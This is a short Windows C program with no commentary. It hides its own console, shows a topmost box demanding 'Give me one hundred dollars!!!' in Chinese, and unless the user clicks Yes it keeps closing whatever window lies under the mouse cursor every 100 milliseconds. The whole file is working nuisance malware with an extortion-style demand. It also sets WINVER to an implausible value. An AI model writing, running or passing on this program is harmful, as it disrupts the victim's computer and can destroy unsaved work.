#define WINVER 0x10086
#include <windows.h>
#include <conio.h>

int main(){
    HWND win;
    POINT pos;
    HWND self = GetConsoleWindow();
    HWND desktop = GetDesktopWindow();
    ShowWindow(GetConsoleWindow(),SW_HIDE);
    int i = MessageBox(NULL,"给我一百美元!!!","",MB_YESNO | MB_TOPMOST);
    if(i == IDYES)return 0;
    while(1){
        GetCursorPos(&pos);
        win = WindowFromPoint(pos);
        if(win == NULL)continue;
        if(win == self || win == desktop)continue;
        PostMessage(win,WM_CLOSE,0,0);
        Sleep(100);
    }
    system("pause");
}
